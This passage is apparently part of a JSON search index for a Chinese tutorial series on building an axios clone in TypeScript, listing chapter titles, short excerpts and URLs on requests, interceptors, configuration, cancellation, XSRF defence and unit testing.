test/mergeConfig.sp","lvl0":"mergeConfig 模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"210ede007bbdd93d710d932b480c587e","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/08.mergeconfig-%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"ts-axios 编译与发布 需求分析 前面的章节我们完成 ts-axios 库的代码编写和单元测试。这一章我们希望把代码部署发布到公共 npm 上，供别人下载使用。但是并不是所有人都会","lvl0":"ts-axios 编译与发布","lvl1":["《TypeScript 从零实现 axios》","ts-axios 部署与发布"],"lvl2":"摘要","objectID":"265d66b49ce638045a622de93f6f775c","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/12.ts-axios-%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%8F%91%E5%B8%83/01.ts-axios-%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%91%E5%B8%83/"},{"content":"withCredentials 需求分析 有些时候我们会发一些跨域请求，比如 http://domain-a.com 站点发送一个 http://api.domain-b.com/get 的请求，默认情况下，浏览器会根据同源策略限制这种跨域请求，但是可以通过 CORS 技术解决","lvl0":"withCredentials","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"4ff385d24cecf505d8281e7e03e793d0","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/01.withcredentials/"},{"content":"XSRF 防御 需求分析 XSRF 又名 CSRF，跨站请求伪造，它是前端常见的一种攻击方式，我们先通过一张图来认识它的攻击手段。 CSRF 的防御手段有很多，比如验证请求","lvl0":"XSRF 防御","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"e6345b3006e3bf4a887ca227620c88c4","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/02.xsrf-%E9%98%B2%E5%BE%A1/"},{"content":"编写基础请求代码 我们这节课开始编写 ts-axios 库，我们的目标是实现简单的发送请求功能，即客户端通过 XMLHttpRequest 对象把请求发送到 server 端，server 端能收到请求并响","lvl0":"编写基础请求代码","lvl1":["《TypeScript 从零实现 axios》","ts-axios 项目初始化"],"lvl2":"摘要","objectID":"bc1686d524312734bd7d2d196462e6a2","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/03.ts-axios-%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96/03.%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%A0%81/"},{"content":"初始化项目 创建代码仓库 接下来，我们开始初始化项目，首先我们先去 GitHub 上创建一个 repo，填好 repo 名称，以及写一下 README，对项目先做个简单的描","lvl0":"初始化项目","lvl1":["《TypeScript 从零实现 axios》","ts-axios 项目初始化"],"lvl2":"摘要","objectID":"cdc7e58591bc73038b96a9023f1772e7","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/03.ts-axios-%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96/02.%E5%88%9D%E5%A7%8B%E5%8C%96%E9%A1%B9%E7%9B%AE/"},{"content":"处理请求 body 数据 需求分析 我们通过执行 XMLHttpRequest 对象实例的 send 方法来发送请求，并通过该方法的参数设置请求 body 数据，我们可以去 mdn 查阅该方法支持的参数类型。 我们","lvl0":"处理请求 body 数据","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"db1d3ec259279f697b8ac168c11b6823","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/02.%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82-body-%E6%95%B0%E6%8D%AE/"},{"content":"处理请求 header 需求分析 我们上节课遗留了一个问题： 1 2 3 4 5 6 7 8 axios({ method: \u0026#39;post\u0026#39;, url: \u0026#39;/base/post\u0026#39;, data: { a: 1, b: 2 } }) 我们做了请求数据的处理，把 data 转换成了 JSON 字符串，但是数据","lvl0":"处理请求 header","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"a686970f19481e815bde108da51564f3","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/03.%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82-header/"},{"content":"处理请求 url 参数 需求分析 还记得我们上节课遗留了一个问题，再来看这个例子： 1 2 3 4 5 6 7 8 axios({ method: \u0026#39;get\u0026#39;, url: \u0026#39;/base/get\u0026#39;, params: { a: 1, b: 2 } }) 我们希望最终请求的 url 是 /ba","lvl0":"处理请求 url 参数","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"7fc78ec587966fc18343012a4c378aff","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/01.%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82-url-%E5%8F%82%E6%95%B0/"},{"content":"处理响应 data 需求分析 在我们不去设置 responseType 的情况下，当服务端返回给我们的数据是字符串类型，我们可以尝试去把它转换成一个 JSON 对象。例如： 1 data: \u0026#34;{\u0026#34;a\u0026#34;:1,\u0026#34;b\u0026#34;:2}\u0026#34; 我们把它转","lvl0":"处理响应 data","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"d5397b39a566edf1ce4e7b44d37e4b57","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/06.%E5%A4%84%E7%90%86%E5%93%8D%E5%BA%94-data/"},{"content":"处理响应 header 需求分析 我们通过 XMLHttpRequest 对象的 getAllResponseHeaders 方法获取到的值是如下一段字符串： 1 2 3 4 5 6 date: Fri, 05 Apr 2019 12:40:49 GMT etag: W/\u0026#34;d-Ssxx4FRxEutDLwo2+xkkxKc4y0k\u0026#34; connection: keep-alive x-powered-by: Express content-length: 13 content-type: application/json; charset=utf-8 每一行都是以回车符和换行","lvl0":"处理响应 header","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"011d9e82d18148b8c9a6d27dc79aacc9","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/05.%E5%A4%84%E7%90%86%E5%93%8D%E5%BA%94-header/"},{"content":"错误处理 需求分析 在上一章节，我们实现了 ts-axios 的基础功能，但目前为止我们都是处理了正常接收请求的逻辑，并没有考虑到任何错误情况的处理，这对于一个程","lvl0":"错误处理","lvl1":["《TypeScript 从零实现 axios》","ts-axios 异常情况处理"],"lvl2":"摘要","objectID":"4816ecd99ece3c0ea6fc341bddbf914e","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/05.ts-axios-%E5%BC%82%E5%B8%B8%E6%83%85%E5%86%B5%E5%A4%84%E7%90%86/01.%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"},{"content":"错误信息增强 需求分析 上一节课我们已经捕获了几类 AJAX 的错误，但是对于错误信息提供的非常有限，我们希望对外提供的信息不仅仅包含错误文本信息，还包括","lvl0":"错误信息增强","lvl1":["《TypeScript 从零实现 axios》","ts-axios 异常情况处理"],"lvl2":"摘要","objectID":"eee5e8b77eb210b213d836947eb25e99","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/05.ts-axios-%E5%BC%82%E5%B8%B8%E6%83%85%E5%86%B5%E5%A4%84%E7%90%86/02.%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E5%A2%9E%E5%BC%BA/"},{"content":"辅助模块单元测试 准备工作 通常我们会优先为一个库的辅助方法编写测试，我们会优先为 ts-axios 库的 helpers 目录下的模块编写测试。我们在 test 目录下创建一个 helpers 目录，创","lvl0":"辅助模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"81d257e668982fca3bc1beddb50dd125","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/03.%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"合并配置的设计与实现 需求分析 在之前的章节我们了解到，在发送请求的时候可以传入一个配置，来决定请求的不同行为。我们也希望 ts-axios 可以有默认配置，定义","lvl0":"合并配置的设计与实现","lvl1":["《TypeScript 从零实现 axios》","ts-axios 配置化实现"],"lvl2":"摘要","objectID":"b5e26008fb59817172698cc731750e21","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/08.ts-axios-%E9%85%8D%E7%BD%AE%E5%8C%96%E5%AE%9E%E7%8E%B0/01.%E5%90%88%E5%B9%B6%E9%85%8D%E7%BD%AE%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"content":"获取响应数据 需求分析 在前面的章节中，我们发送的请求都可以从网络层面接收到服务端返回的数据，但是代码层面并没有做任何关于返回数据的处理。我们希","lvl0":"获取响应数据","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"115fc094d6bc7cdcc1d20353a8bc9759","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/04.%E8%8E%B7%E5%8F%96%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE/"},{"content":"静态方法扩展 需求分析 官方 axios 库实现了 axios.all、axios.spread 等方法，它们的用法如下： 1 2 3 4 5 6 7 8 9 10 11 12 function getUserAccount() { return axios.get(\u0026#39;/user/12345\u0026#39;); } function","lvl0":"静态方法扩展","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"9c41ad7df4165a22156dce1c1a7210eb","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/08.%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E6%89%A9%E5%B1%95/"},{"content":"扩展 axios.create 静态接口 需求分析 目前为止，我们的 axios 都是一个单例，一旦我们修改了 axios 的默认配置，会影响所有的请求。我们希望提供了一个 axios.create 的静态接口允许我们创","lvl0":"扩展 create 静态接口","lvl1":["《TypeScript 从零实现 axios》","ts-axios 配置化实现"],"lvl2":"摘要","objectID":"a1b1c1217b89f80d1b45ae96a1c5600b","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/08.ts-axios-%E9%85%8D%E7%BD%AE%E5%8C%96%E5%AE%9E%E7%8E%B0/03.%E6%89%A9%E5%B1%95-create-%E9%9D%99%E6%80%81%E6%8E%A5%E5%8F%A3/"},{"content":"扩展接口 需求分析 为了用户更加方便地使用 axios 发送请求，我们可以为所有支持请求方法扩展一些接口： axios.request(config) axios.get(url[, config]) axios.delete(url[, config]) axios.head(url[, config]) axios.options(url[, config]) axios.post(url[, data[, config]]) axios.put(url[, data[, config]]) axios.patch(url[, data[, config]]) 如果使用了这些","lvl0":"扩展接口","lvl1":["《TypeScript 从零实现 axios》","ts-axios 接口扩展"],"lvl2":"摘要","objectID":"03cc4ba06a5d8b7a2f91a1e895bf2dc6","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/06.ts-axios-%E6%8E%A5%E5%8F%A3%E6%89%A9%E5%B1%95/01.%E6%89%A9%E5%B1%95%E6%8E%A5%E5%8F%A3/"},{"content":"拦截器模块单元测试 拦截器是 ts-axios 库一个非常实用的功能，接下来我们来编写它的测试代码。 测试代码编写 test/interceptor.spec.ts","lvl0":"拦截器模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"d0b4af954900ae2cf494f258802062d4","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/07.%E6%8B%A6%E6%88%AA%E5%99%A8%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"拦截器设计与实现 需求分析 我们希望能对请求的发送和响应做拦截，也就是在发送请求之前和接收到响应之后做一些额外逻辑。 我们希望设计的拦截器的使用方","lvl0":"拦截器设计与实现","lvl1":["《TypeScript 从零实现 axios》","ts-axios 拦截器实现"],"lvl2":"摘要","objectID":"f04ec4baa00101d85d73890390ff0f1b","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/07.ts-axios-%E6%8B%A6%E6%88%AA%E5%99%A8%E5%AE%9E%E7%8E%B0/01.%E6%8B%A6%E6%88%AA%E5%99%A8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"content":"前言 单元测试是前端一个很重要的方向，鉴别一个开源库是否靠谱的一个标准是它的单元测试是否完善。有了完整的单元测试，未来你去重构现有代码或者是增","lvl0":"前言","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"b1a877caebd6d356783b5805851b2872","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/01.%E5%89%8D%E8%A8%80/"},{"content":"请求和响应配置化 需求分析 官方的 axios 库 给默认配置添加了 transformRequest 和 transformResponse 两个字段，它们的值是一个数组或者是一个函数。 其中 transformRequest 允许你在将请求数据发送到服务器之前","lvl0":"请求和响应配置化","lvl1":["《TypeScript 从零实现 axios》","ts-axios 配置化实现"],"lvl2":"摘要","objectID":"8707ac8d4bbdeba8ad5ec9fac4616867","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/08.ts-axios-%E9%85%8D%E7%BD%AE%E5%8C%96%E5%AE%9E%E7%8E%B0/02.%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94%E9%85%8D%E7%BD%AE%E5%8C%96/"},{"content":"请求模块单元测试 请求模块是 axios 最基础的模块，通过一个 axios 方法发送 Ajax 请求。 jasmine-ajax Jasmine 是一个 BDD(行为驱动开发)的测试框架，它有很多成熟的插件，比如我们","lvl0":"请求模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"c87903a64c5b8c8ffa4f0ec66c88b909","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/04.%E8%AF%B7%E6%B1%82%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"请求取消模块单元测试 请求取消模块是 ts-axios 库核心流程其中一个分支，也是非常重要的模块，我们将从基础库和业务流程模块 2 个方面去编写单元测试。 Cancel 类单元","lvl0":"请求取消模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"5618c644b133689a1c4cf3f367327f34","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/09.%E8%AF%B7%E6%B1%82%E5%8F%96%E6%B6%88%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"取消功能的设计与实现 需求分析 有些场景下，我们希望能主动取消请求，比如常见的搜索框案例，在用户输入过程中，搜索框的内容也在不断变化，正常情况每","lvl0":"取消功能的设计与实现","lvl1":["《TypeScript 从零实现 axios》","ts-axios 取消功能实现"],"lvl2":"摘要","objectID":"d1af96eeb2aed9adbe0d4f85495dd945","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/09.ts-axios-%E5%8F%96%E6%B6%88%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/01.%E5%8F%96%E6%B6%88%E5%8A%9F%E8%83%BD%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"content":"上传和下载的进度监控 需求分析 有些时候，当我们上传文件或者是请求一个大体积数据的时候，希望知道实时的进度，甚至可以基于此做一个进度条的展示。 我","lvl0":"上传和下载的进度监控","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"0c1cf1b098ee679ba8c1d28726a5221a","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/03.%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD%E7%9A%84%E8%BF%9B%E5%BA%A6%E7%9B%91%E6%8E%A7/"},{"content":"剩余模块单元测试 defaults 模块单元测试 defaults 模块为请求配置提供了一些默认的属性和方法，我们需要为其编写单元测试。 test/defaults.spec.t","lvl0":"剩余模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"1abe0f7f305e1de9c6b8a7caa81400d6","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/10.%E5%89%A9%E4%BD%99%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"响应数据支持泛型 需求分析 通常情况下，我们会把后端返回数据格式单独放入一个接口中： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 请求接口数据 export interface ResponseData\u0026lt;T","lvl0":"响应数据支持泛型","lvl1":["《TypeScript 从零实现 axios》","ts-axios 接口扩展"],"lvl2":"摘要","objectID":"b5f81b6e2524d8b614688799197da105","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/06.ts-axios-%E6%8E%A5%E5%8F%A3%E6%89%A9%E5%B1%95/03.%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE%E6%94%AF%E6%8C%81%E6%B3%9B%E5%9E%8B/"},{"content":"需求分析 接下来的章节，我们会使用 TypeScript 来重构 axios，重构之前，我们需要简单地做一些需求分析，看一下我们这次重构需要支持哪些 feature。 Features","lvl0":"需求分析","lvl1":["《TypeScript 从零实现 axios》","ts-axios 项目初始化"],"lvl2":"摘要","objectID":"39bb88cebd535ab9e714bbe7bddfb552","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/03.ts-axios-%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96/01.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/"},{"content":"引用 ts-axios 库 在 TS 项目中引用 我们借助于 vue-cli 脚手架创建一个 TypeScript 的 Vue 项目，然后我们把 Vue 官网上一段使用 axios 发请求的 demo 代码抄过来。 我们需要先执行 npm install ts-axios-new 安装 ts-axios 库。","lvl0":"引用 ts-axios 库","lvl1":["《TypeScript 从零实现 axios》","ts-axios 部署与发布"],"lvl2":"摘要","objectID":"af4696b57415c766ef40c699c76aff2d","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/12.ts-axios-%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%8F%91%E5%B8%83/02.%E5%BC%95%E7%94%A8-ts-axios-%E5%BA%93/"},{"content":"自定义参数序列化 需求分析 在之前的章节，我们对请求的 url 参数做了处理，我们会解析传入的 params 对象，根据一定的规则把它解析成字符串，然后添加在 url 后面。","lvl0":"自定义参数序列化","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"f9141f06a424338b92701a2416a07322","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/06.%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%82%E6%95%B0%E5%BA%8F%E5%88%97%E5%8C%96/"},{"content":"自定义合法状态码 需求分析 之前 ts-axios 在处理响应结果的时候，认为 HTTP status 在 200 和 300 之间是一个合法值，在这个区间之外则创建一个错误。有些时候我们想自定义这个","lvl0":"自定义合法状态码","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"b29fd649980718691ee4e3570fb5c8a7","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/05.%E8%87%AA%E5%AE%9A%E4%B9%89%E5%90%88%E6%B3%95%E7%8A%B6%E6%80%81%E7%A0%81/"},{"content":"","lvl0":"《TypeScript 从零实现 axios》","lvl1":null,"lvl2":"摘要","objectID":"df46c3bf03c2c64075ec4cf4ea005e20","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/30.typescript-%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/"},{"content":"变量声明 let 和 const 是 JavaScript 里相对较新的变量声明方式。let 在很多方面与 var 是相似的，但是可以帮助大家避免在 JavaScript 里常见一些问题。const 是对 let 的一个增强","lvl0":"变量声明","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"14687582cdd0292cdea252209ebba6d6","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/02.%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E/"},{"content":"泛型 软件工程中，我们不仅要创建定义良好且一致的 API，同时也要考虑可重用性。 组件不仅能够支持当前的数据类型，同时也能支持未来的数据类型，这在","lvl0":"泛型","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"0804f0954496e4c1cdc86cf604eec600","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/06.%E6%B3%9B%E5%9E%8B/"},{"content":"高级类型 交叉类型 交叉类型是将多个类型合并为一个类型。 这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。 例如，","lvl0":"高级类型","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"ae5162b4dc000480606ef0c69e5c41da","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/08.%E9%AB%98%E7%BA%A7%E7%B1%BB%E5%9E%8B/"},{"content":"函数 函数是 JavaScript 应用程序的基础，它帮助你实现抽象层，模拟类，信息隐藏和模块。在 TypeScript 里，虽然已经支持类，命名空间和模块，但函数仍然是主要的定义行为的","lvl0":"函数","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"8ca4a26355ccba265a89e621c5335102","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/05.%E5%87%BD%E6%95%B0/"},{"content":"基础类型 TypeScript 支持与 JavaScript 几乎相同的数据类型，此外还提供了实用的枚举类型方便我们使用。 布尔值 最基本的数据类型就是简单的 true/false 值，在JavaScript 和","lvl0":"基础类型","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"672987839a28edc5d0e4b0c3e2f28dff","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/01.%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/"},{"content":"接口 TypeScript 的核心原则之一是对值所具有的结构进行类型检查。它有时被称做“鸭式辨型法”或“结构性子类型化”。 在 TypeScript 